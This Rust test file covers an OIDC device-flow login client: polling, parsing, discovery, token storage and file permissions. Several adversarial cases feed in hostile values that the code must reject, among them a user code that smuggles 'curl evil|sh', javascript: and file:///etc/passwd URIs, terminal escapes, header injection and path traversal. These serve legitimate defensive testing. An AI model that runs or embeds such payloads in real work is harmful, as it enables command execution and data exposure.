use std::os::unix::fs::PermissionsExt;

use agent_testkit::oidc::{DeviceOutcome, DeviceScript, FakeIssuer, TestKey, USER_CODE};
use rstest::rstest;
use serde_json::json;

use super::*;

// --- the token endpoint -------------------------------------------------------------

#[rstest]
#[case::positive_granted(true, json!({"id_token": "a.b.c"}), PollAnswer::Granted("a.b.c".into()))]
#[case::positive_pending(false, json!({"error": "authorization_pending"}), PollAnswer::Pending)]
#[case::positive_slow_down(false, json!({"error": "slow_down"}), PollAnswer::SlowDown)]
#[case::negative_denied(false, json!({"error": "access_denied"}), PollAnswer::Denied)]
#[case::negative_expired(false, json!({"error": "expired_token"}), PollAnswer::Expired)]
#[case::negative_other_error(false, json!({"error": "invalid_client"}), PollAnswer::Failed("the issuer refused the device code (invalid_client)".into()))]
#[case::corner_success_without_id_token(true, json!({"access_token": "x"}), PollAnswer::Failed("the issuer answered without an ID token (is `openid` in its scopes?)".into()))]
#[case::corner_empty_id_token(true, json!({"id_token": ""}), PollAnswer::Failed("the issuer answered without an ID token (is `openid` in its scopes?)".into()))]
#[case::corner_error_without_code(false, json!({}), PollAnswer::Failed("the issuer refused the device code".into()))]
#[case::adversarial_control_chars_in_error(false, json!({"error": "x\u{1b}[2J"}), PollAnswer::Failed("the issuer refused the device code".into()))]
#[case::adversarial_huge_error(false, json!({"error": "e".repeat(10_000)}), PollAnswer::Failed("the issuer refused the device code".into()))]
fn classify_poll_cases(#[case] ok: bool, #[case] body: Value, #[case] want: PollAnswer) {
    assert_eq!(classify_poll(ok, &body), want);
}

fn timing(floor_ms: u64, step_ms: u64) -> PollTiming {
    PollTiming {
        floor: Duration::from_millis(floor_ms),
        slow_down_step: Duration::from_millis(step_ms),
    }
}

#[rstest]
#[case::positive_pending_keeps_pace(5_000, PollAnswer::Pending, 5_000)]
#[case::positive_slow_down_adds_step(5_000, PollAnswer::SlowDown, 10_000)]
#[case::boundary_zero_interval_raised_to_floor(0, PollAnswer::Pending, 1_000)]
#[case::boundary_capped_at_max(59_000, PollAnswer::SlowDown, MAX_INTERVAL_SECS * 1_000)]
#[case::adversarial_huge_interval_capped(u64::MAX / 2, PollAnswer::Pending, MAX_INTERVAL_SECS * 1_000)]
fn next_interval_cases(#[case] current_ms: u64, #[case] answer: PollAnswer, #[case] want_ms: u64) {
    let got = next_interval(
        Duration::from_millis(current_ms),
        &answer,
        PollTiming::default(),
    );
    assert_eq!(got, Duration::from_millis(want_ms));
}

// --- the device endpoint's answer ---------------------------------------------------

fn device_body() -> Value {
    json!({
        "device_code": "dc",
        "user_code": "ABCD-EFGH",
        "verification_uri": "https://idp.example/device",
        "verification_uri_complete": "https://idp.example/device?code=ABCD-EFGH",
        "expires_in": 900,
        "interval": 7,
    })
}

fn with(key: &str, value: Value) -> Value {
    let mut body = device_body();
    if value.is_null() {
        body.as_object_mut().expect("object").remove(key);
    } else {
        body[key] = value;
    }
    body
}

#[test]
fn positive_device_answer_parsed() {
    let (prompt, code, interval) = device_answer(true, &device_body()).expect("valid answer");
    assert_eq!(
        prompt,
        DevicePrompt {
            verification_uri: "https://idp.example/device".into(),
            verification_uri_complete: Some("https://idp.example/device?code=ABCD-EFGH".into()),
            user_code: "ABCD-EFGH".into(),
            expires_in: Duration::from_secs(900),
        }
    );
    assert_eq!(code, "dc");
    assert_eq!(interval, Duration::from_secs(7));
}

#[rstest]
#[case::corner_google_verification_url(
    with("verification_uri", Value::Null).tap_insert("verification_url", json!("https://www.google.com/device")),
    "https://www.google.com/device"
)]
#[case::corner_no_complete_uri(
    with("verification_uri_complete", Value::Null),
    "https://idp.example/device"
)]
#[case::positive_loopback_http(with("verification_uri", json!("http://127.0.0.1:9/verify")), "http://127.0.0.1:9/verify")]
fn device_answer_verification_uri(#[case] body: Value, #[case] want: &str) {
    let (prompt, _, _) = device_answer(true, &body).expect("valid answer");
    assert_eq!(prompt.verification_uri, want);
}

#[rstest]
#[case::boundary_expiry_clamped(with("expires_in", json!(u64::MAX)), MAX_DEVICE_WINDOW_SECS, 7)]
#[case::corner_defaults_when_absent(
    with("expires_in", Value::Null).tap_remove("interval"),
    600,
    DEFAULT_INTERVAL_SECS
)]
#[case::adversarial_negative_numbers_default(
    with("expires_in", json!(-5)).tap_insert("interval", json!(-1)),
    600,
    DEFAULT_INTERVAL_SECS
)]
fn device_answer_numbers(#[case] body: Value, #[case] expires: u64, #[case] interval: u64) {
    let (prompt, _, got) = device_answer(true, &body).expect("valid answer");
    assert_eq!(prompt.expires_in, Duration::from_secs(expires));
    assert_eq!(got, Duration::from_secs(interval));
}

#[rstest]
#[case::negative_refused_with_code(false, json!({"error": "invalid_client"}), "refused (invalid_client)")]
#[case::negative_refused_plain(false, json!({}), "device authorization refused")]
#[case::negative_no_device_code(true, with("device_code", Value::Null), "device_code")]
#[case::negative_empty_device_code(true, with("device_code", json!("")), "device_code")]
#[case::negative_no_user_code(true, with("user_code", Value::Null), "user_code")]
#[case::negative_no_verification_uri(
    true,
    with("verification_uri", Value::Null),
    "verification_uri"
)]
#[case::adversarial_refusal_code_with_escape(false, json!({"error": "\u{1b}]0;pwned\u{7}"}), "device authorization refused")]
#[case::adversarial_user_code_escape(true, with("user_code", json!("AB\u{1b}[2JCD")), "user_code")]
#[case::adversarial_user_code_newline(true, with("user_code", json!("AB\nrun: curl evil|sh")), "user_code")]
#[case::adversarial_user_code_huge(true, with("user_code", json!("A".repeat(65))), "user_code")]
#[case::adversarial_device_code_huge(true, with("device_code", json!("d".repeat(MAX_DISPLAY_CHARS + 1))), "device_code")]
#[case::adversarial_javascript_uri(true, with("verification_uri", json!("javascript:alert(1)")), "`verification_uri` is not an https URL")]
#[case::adversarial_plain_http_remote(true, with("verification_uri", json!("http://evil.example/device")), "`verification_uri` is not an https URL")]
#[case::adversarial_uri_with_credentials(true, with("verification_uri", json!("https://user:pw@idp.example/")), "`verification_uri` is not an https URL")]
#[case::adversarial_uri_escape(true, with("verification_uri", json!("https://idp.example/\u{1b}[2J")), "`verification_uri` is not an https URL")]
#[case::adversarial_complete_uri_bad(true, with("verification_uri_complete", json!("file:///etc/passwd")), "`verification_uri_complete`")]
#[case::adversarial_google_url_bad(
    true,
    with("verification_uri", Value::Null).tap_insert("verification_url", json!("http://evil.example/")),
    "`verification_url`"
)]
fn device_answer_rejections(#[case] ok: bool, #[case] body: Value, #[case] want: &str) {
    let err = device_answer(ok, &body).expect_err("rejected");
    assert!(err.contains(want), "{err:?} lacks {want:?}");
}

/// Small builders so a table case can reshape the canned body inline.
trait Tap {
    fn tap_insert(self, key: &str, value: Value) -> Self;
    fn tap_remove(self, key: &str) -> Self;
}

impl Tap for Value {
    fn tap_insert(mut self, key: &str, value: Value) -> Self {
        self[key] = value;
        self
    }
    fn tap_remove(mut self, key: &str) -> Self {
        self.as_object_mut().expect("object").remove(key);
        self
    }
}

// --- discovery + the whole device flow against the fake issuer ----------------------

fn http() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .expect("client")
}

fn script(slow_down: bool, pending: usize, outcome: DeviceOutcome) -> DeviceScript {
    DeviceScript {
        interval: 0,
        slow_down,
        pending,
        outcome,
    }
}

#[tokio::test]
async fn positive_discovery_finds_device_endpoints() {
    let idp = FakeIssuer::start_device(TestKey::Rsa, script(false, 0, DeviceOutcome::Deny));
    let got = discover_device(&http(), idp.issuer())
        .await
        .expect("discovered");
    assert_eq!(
        got,
        DeviceEndpoints {
            device: format!("{}/device", idp.issuer()),
            token: format!("{}/token", idp.issuer()),
        }
    );
}

#[tokio::test]
async fn negative_discovery_without_device_flow() {
    let idp = FakeIssuer::start(TestKey::Rsa);
    let err = discover_device(&http(), idp.issuer())
        .await
        .expect_err("no device flow");
    assert!(err.contains("device_authorization_endpoint"), "{err}");
    assert!(err.contains("device client"), "{err}");
}

#[tokio::test]
async fn adversarial_discovery_naming_another_issuer() {
    let idp = FakeIssuer::start_advertising(TestKey::Rsa, "https://accounts.example");
    let err = discover_device(&http(), idp.issuer())
        .await
        .expect_err("mix-up");
    assert!(err.contains("different issuer"), "{err}");
}

#[rstest]
#[case::adversarial_plain_http_remote("http://idp.example")]
#[case::adversarial_credentials("https://u:p@idp.example")]
#[case::adversarial_not_a_url("not a url")]
#[tokio::test]
async fn discovery_refuses_unsafe_issuer_url(#[case] issuer: &str) {
    let err = discover_device(&http(), issuer).await.expect_err("refused");
    assert!(err.starts_with("the issuer URL"), "{err}");
}

#[tokio::test]
async fn negative_discovery_unreachable() {
    let err = discover_device(&http(), "http://127.0.0.1:1")
        .await
        .expect_err("unreachable");
    assert!(err.starts_with("discovery:"), "{err}");
}

fn client(secret: Option<&str>) -> DeviceClient {
    DeviceClient {
        client_id: "cli-client".into(),
        client_secret: secret.map(str::to_string),
    }
}

async fn run_device(
    idp: &FakeIssuer,
    secret: Option<&str>,
) -> (Result<String, String>, Option<DevicePrompt>) {
    let endpoints = discover_device(&http(), idp.issuer())
        .await
        .expect("discovered");
    let mut shown = None;
    let got = device_login(&http(), &endpoints, &client(secret), timing(0, 5), |p| {
        shown = Some(p.clone());
    })
    .await;
    (got, shown)
}

#[tokio::test]
async fn positive_device_login_after_slow_down_and_pending() {
    let idp = FakeIssuer::start_device(
        TestKey::Ec,
        script(true, 2, DeviceOutcome::Grant(json!({"sub": "alice"}))),
    );
    let (got, shown) = run_device(&idp, None).await;
    let id_token = got.expect("granted");
    assert_eq!(id_token.split('.').count(), 3, "a JWT");
    let shown = shown.expect("prompt shown");
    assert_eq!(shown.user_code, USER_CODE);
    assert_eq!(shown.verification_uri, format!("{}/verify", idp.issuer()));
    // One /device, then slow_down + 2 pending + the grant.
    let requests = idp.token_requests();
    assert_eq!(requests.len(), 5, "{requests:?}");
    assert!(requests[1..].iter().all(|r| r.contains("grant_type=urn")));
    assert!(requests.iter().all(|r| !r.contains("client_secret")));
}

#[tokio::test]
async fn positive_client_secret_sent_on_every_request() {
    let idp = FakeIssuer::start_device(
        TestKey::Rsa,
        script(false, 0, DeviceOutcome::Grant(json!({"sub": "alice"}))),
    );
    run_device(&idp, Some("s3cret")).await.0.expect("granted");
    let requests = idp.token_requests();
    assert_eq!(requests.len(), 2);
    assert!(requests.iter().all(|r| r.contains("client_secret=s3cret")));
}

#[rstest]
#[case::negative_denied(DeviceOutcome::Deny, "refused at the issuer")]
#[case::negative_expired(DeviceOutcome::Expire, "expired")]
#[tokio::test]
async fn device_login_endings(#[case] outcome: DeviceOutcome, #[case] want: &str) {
    let idp = FakeIssuer::start_device(TestKey::Rsa, script(false, 1, outcome));
    let err = run_device(&idp, None).await.0.expect_err("no token");
    assert!(err.contains(want), "{err}");
}

#[test]
fn adversarial_device_client_debug_redacts_secret() {
    let shown = format!("{:?}", client(Some("s3cret")));
    assert!(!shown.contains("s3cret"), "{shown}");
    assert!(shown.contains("<redacted>"), "{shown}");
}

// --- the stored login ---------------------------------------------------------------

const NOW: u64 = 1_000_000;

fn response(token: &str, expires_at: u64, handle: &str) -> pb::ExchangeResponse {
    pb::ExchangeResponse {
        access_token: token.into(),
        token_type: "Bearer".into(),
        expires_at,
        refresh_handle: handle.into(),
        session_expires_at: NOW + 43_200,
        ..Default::default()
    }
}

fn login(expires_at: u64) -> StoredLogin {
    StoredLogin {
        endpoint: "http://127.0.0.1:1".into(),
        issuer: "google".into(),
        access_token: "tok".into(),
        expires_at,
        refresh_handle: "handle".into(),
        session_expires_at: NOW + 43_200,
    }
}

#[rstest]
#[case::positive_usable(response("tok", NOW + 900, "h"), Ok(NOW + 900))]
#[case::negative_empty_token(response("", NOW + 900, "h"), Err("no usable token"))]
#[case::negative_no_handle(response("tok", NOW + 900, ""), Err("no refresh handle"))]
#[case::boundary_within_skew(response("tok", NOW + REFRESH_SKEW_SECS, "h"), Err("no usable token"))]
#[case::negative_already_expired(response("tok", NOW - 1, "h"), Err("no usable token"))]
#[case::adversarial_huge_expiry_capped(response("tok", u64::MAX, "h"), Ok(NOW + crate::client::service_token::MAX_LIFETIME_SECS))]
fn from_response_cases(#[case] resp: pb::ExchangeResponse, #[case] want: Result<u64, &str>) {
    let got = StoredLogin::from_response("ep", "google", resp, NOW);
    match (got, want) {
        (Ok(l), Ok(expires_at)) => {
            assert_eq!(l.expires_at, expires_at);
            assert_eq!((l.endpoint.as_str(), l.issuer.as_str()), ("ep", "google"));
        }
        (Err(e), Err(want)) => assert!(e.contains(want), "{e}"),
        (got, want) => panic!("got {got:?}, want {want:?}"),
    }
}

#[rstest]
#[case::positive_fresh(NOW + 900, true)]
#[case::boundary_at_skew(NOW + REFRESH_SKEW_SECS, false)]
#[case::boundary_just_past_skew(NOW + REFRESH_SKEW_SECS + 1, true)]
#[case::negative_expired(NOW - 1, false)]
fn bearer_at_cases(#[case] expires_at: u64, #[case] usable: bool) {
    assert_eq!(login(expires_at).bearer_at(NOW).is_some(), usable);
}

#[tokio::test]
async fn adversarial_newline_in_stored_token_refused_not_sent() {
    let auth = AgentAuth::connect("http://127.0.0.1:1").expect("lazy");
    let err = auth
        .who_am_i("tok\r\nx-agent-user-id: other")
        .await
        .expect_err("refused");
    assert_eq!(err.code(), tonic::Code::Unauthenticated);
    assert!(
        err.message().contains("not a valid header"),
        "{}",
        err.message()
    );
}

#[test]
fn adversarial_stored_login_debug_redacts_secrets() {
    let mut l = login(NOW);
    l.access_token = "SECRET-TOKEN".into();
    l.refresh_handle = "SECRET-HANDLE".into();
    let shown = format!("{l:?}");
    assert!(!shown.contains("SECRET"), "{shown}");
}

// --- the token file -----------------------------------------------------------------

#[rstest]
#[case::positive_plain("google", true)]
#[case::positive_dotted("idp.example", true)]
#[case::adversarial_traversal("..", false)]
#[case::adversarial_separator("a/b", false)]
#[case::adversarial_leading_dash("-rf", false)]
#[case::negative_empty("", false)]
fn token_file_name_cases(#[case] issuer: &str, #[case] ok: bool) {
    let dir = agent_testkit::tempdir();
    let got = TokenFile::in_dir(&dir, issuer);
    assert_eq!(got.is_ok(), ok, "{got:?}");
    if let Ok(f) = got {
        assert_eq!(f.path().parent(), Some(dir.as_path()));
    }
}

fn file_in(dir: &Path) -> TokenFile {
    TokenFile::in_dir(dir, "google").expect("plain name")
}

#[test]
fn positive_save_load_round_trip_owner_only() {
    let dir = agent_testkit::tempdir().join("tokens");
    let file = file_in(&dir);
    assert_eq!(file.load().expect("absent is fine"), None);
    file.save(&login(NOW + 900)).expect("saved");
    assert_eq!(file.load().expect("loads"), Some(login(NOW + 900)));
    let mode = |p: &Path| std::fs::metadata(p).expect("meta").permissions().mode() & 0o777;
    assert_eq!(mode(file.path()), 0o600);
    assert_eq!(mode(&dir), 0o700);
    // Overwrite leaves no temporary behind.
    file.save(&login(NOW + 1_800)).expect("saved again");
    assert_eq!(
        file.load().expect("loads").map(|l| l.expires_at),
        Some(NOW + 1_800)
    );
    assert_eq!(std::fs::read_dir(&dir).expect("dir").count(), 1);
}

#[test]
fn positive_remove_reports_whether_there_was_one() {
    let file = file_in(&agent_testkit::tempdir());
    assert!(!file.remove().expect("absent"));
    file.save(&login(NOW)).expect("saved");
    assert!(file.remove().expect("removed"));
    assert_eq!(file.load().expect("gone"), None);
}

enum Plant {
    Mode(u32),
    Oversize,
    Garbage,
    Symlink,
    Directory,
}

#[rstest]
#[case::negative_world_readable(Plant::Mode(0o644), "readable by others")]
#[case::negative_group_readable(Plant::Mode(0o640), "readable by others")]
#[case::adversarial_oversize(Plant::Oversize, "over 64 KiB")]
#[case::adversarial_garbage(Plant::Garbage, "not a stored login")]
#[case::adversarial_symlink(Plant::Symlink, "not a regular file")]
#[case::corner_directory(Plant::Directory, "not a regular file")]
fn load_refuses(#[case] plant: Plant, #[case] want: &str) {
    let dir = agent_testkit::tempdir();
    let file = file_in(&dir);
    let owner_only = |p: &Path| {
        std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o600)).expect("chmod");
    };
    match plant {
        Plant::Mode(mode) => {
            file.save(&login(NOW)).expect("saved");
            std::fs::set_permissions(file.path(), std::fs::Permissions::from_mode(mode))
                .expect("chmod");
        }
        Plant::Oversize => {
            std::fs::write(file.path(), vec![b' '; MAX_TOKEN_FILE_BYTES as usize + 1])
                .expect("write");
            owner_only(file.path());
        }
        Plant::Garbage => {
            std::fs::write(file.path(), b"{\"not\": \"a login\"}").expect("write");
            owner_only(file.path());
        }
        Plant::Symlink => {
            let target = dir.join("elsewhere.json");
            std::fs::write(&target, serde_json::to_vec(&login(NOW)).expect("json")).expect("write");
            owner_only(&target);
            std::os::unix::fs::symlink(&target, file.path()).expect("symlink");
        }
        Plant::Directory => std::fs::create_dir(file.path()).expect("mkdir"),
    }
    let err = file.load().expect_err("refused");
    assert!(err.contains(want), "{err}");
}

#[test]
fn boundary_file_at_cap_is_read() {
    let file = file_in(&agent_testkit::tempdir());
    let mut body = serde_json::to_vec(&login(NOW)).expect("json");
    body.resize(MAX_TOKEN_FILE_BYTES as usize, b' ');
    std::fs::write(file.path(), body).expect("write");
    std::fs::set_permissions(file.path(), std::fs::Permissions::from_mode(0o600)).expect("chmod");
    assert_eq!(file.load().expect("at the cap"), Some(login(NOW)));
}

// --- refresh without a reachable agent ----------------------------------------------

fn unreachable() -> AgentAuth {
    AgentAuth::connect("http://127.0.0.1:1").expect("lazy")
}

#[tokio::test]
async fn positive_refresh_adopts_newer_file_without_spending_the_handle() {
    let file = file_in(&agent_testkit::tempdir());
    let now = now_secs();
    let fresh = login(now + 900);
    file.save(&fresh).expect("saved");
    // Another process wrote `fresh`; we still hold an older token. The agent is
    // unreachable, so reaching it would fail: adoption must not dial.
    let got = refresh_stored(&file, &unreachable(), Some(&login(now + 10)))
        .await
        .expect("adopted");
    assert_eq!(got, fresh);
}

#[tokio::test]
async fn corner_refresh_with_same_token_dials_the_agent() {
    let file = file_in(&agent_testkit::tempdir());
    let current = login(now_secs() + 900);
    file.save(&current).expect("saved");
    // Not newer than what we hold, so a refresh is really wanted; the agent is down.
    let err = refresh_stored(&file, &unreachable(), Some(&current))
        .await
        .expect_err("unreachable");
    assert!(matches!(err, RefreshError::Transient(_)), "{err:?}");
    assert_eq!(
        file.load().expect("kept"),
        Some(current),
        "the file is untouched"
    );
}

#[tokio::test]
async fn negative_refresh_after_logout_file_removed() {
    let file = file_in(&agent_testkit::tempdir());
    let err = refresh_stored(&file, &unreachable(), None)
        .await
        .expect_err("gone");
    assert!(matches!(err, RefreshError::Ended(_)), "{err:?}");
}

#[test]
fn negative_bearer_source_needs_a_login() {
    let file = file_in(&agent_testkit::tempdir());
    let err = LoginBearerSource::open(file).err().expect("not signed in");
    assert!(err.contains("agent login"), "{err}");
}

#[tokio::test]
async fn positive_bearer_source_serves_the_stored_token() {
    let file = file_in(&agent_testkit::tempdir());
    file.save(&login(now_secs() + 900)).expect("saved");
    let source = LoginBearerSource::open(file).expect("signed in");
    assert!(source.bearer().is_some());
}

#[tokio::test]
async fn boundary_bearer_source_withholds_a_stale_token() {
    let file = file_in(&agent_testkit::tempdir());
    file.save(&login(now_secs() + 5)).expect("saved");
    let source = LoginBearerSource::open(file).expect("signed in");
    assert!(source.bearer().is_none(), "within the skew window");
}
